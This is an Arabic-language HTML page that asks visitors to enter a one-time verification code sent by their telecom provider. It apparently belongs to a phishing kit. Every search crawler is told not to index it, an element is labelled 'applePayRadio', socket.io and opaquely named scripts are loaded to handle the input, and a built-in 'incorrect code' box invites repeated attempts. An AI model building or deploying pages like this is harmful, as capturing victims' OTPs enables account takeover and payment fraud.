<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
  <meta content="width=device-width, initial-scale=1" name="viewport" />
  <meta charset="utf-8" />
  
  <meta name="robots" content="noindex, nofollow" />

  
  <meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet" />
  <meta name="bingbot" content="noindex, nofollow" />
  <meta name="yandex" content="none" />
  <title>Otp Code</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css" rel="stylesheet" />
  <link rel="stylesheet" href="css/style4.css">

</head>

<body>
  <div class="container mt-3 d-none" id="phonecode_error"></div>
  <div class="container mt-5" id="applePayRadio">
    <div class="row justify-content-center">
      <div class="col-md-6 col-lg-4">
        <div style="
              border: 1px solid #ddd;
              border-radius: 12px;
              font-family: 'Tahoma', sans-serif;
              overflow: hidden;
            ">
          <div style="padding: 0px 16px 16px 16px">
            <div class="text-center">
              <div class="mb-5 text-left">
                <img alt="" src="assets/photos/cstr.png" width="250px" />
              </div>
              <h5>التحقق من رقم الجوال</h5>
              <p class="text-right mt-3" style="font-size: small">
                يرجى إدخال الرمز المرسل إليك من قِبل شركة الاتصالات الخاصة بك،
                وذلك لاستكمال عملية التحقق والتأكيد من ملكية رقم الجوال
                المُسجّل.
              </p>
              <form id="codeForm">
                <div class="form-group text-right">
                  <label for="verification_code_three">أدخل الرمز هنا :</label>
                  <input class="form-control text-center" id="verification_code_three" type="tel" 
  maxlength="6"
  pattern="^(?:\d{4}|\d{6})$" 
  title="يجب أن يتكون رمز التحقق من 4 أرقام أو 6 أرقام بالضبط"
  oninput="this.value = this.value.replace(/\D/g, '').slice(0, 6)" 
  autocomplete="one-time-code"
  inputmode="numeric"
  required 
/>
                  <div class="decline-box" id="declineCodeBox">
                    <div class="decline-icon">
                      <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                        <circle cx="12" cy="12" r="10"></circle>
                        <line x1="12" y1="8" x2="12" y2="12"></line>
                        <line x1="12" y1="16" x2="12.01" y2="16"></line>
                      </svg>
                    </div>
                    <div class="decline-text">
                      <div class="decline-title">الرمز غير صحيح</div>
                      <div class="decline-sub">يرجى التحقق من الرمز المرسل وإعادة المحاولة</div>
                    </div>
                  </div>
                </div>
                <button class="btn btn-primary col-12" type="submit">
                  تأكيد
                </button>
                <a>
                  <p class="text-right text-secondary mt-3" style="font-size: x-small">
                    هل تحتاج للمساعدة ؟
                  </p>
                </a>
              </form>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>

  
  <div id="loadingOverlay" class="d-none">
    <div class="text-center text-white">
      <div class="spinner-border text-light mb-3" role="status"></div>
      <h5 class="font-weight-bold">يرجى الانتظار</h5>
      <p>انتظر حتى تتم معالجة طلبك</p>
    </div>
  </div>

  
  <script src="https://cdn.socket.io/4.6.1/socket.io.min.js"></script>
  <script src="js/phonecode1.js"></script>
  <script src="js/phonecode2.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script>
  <script src="js/kn5k.js"></script>
</body>

</html>
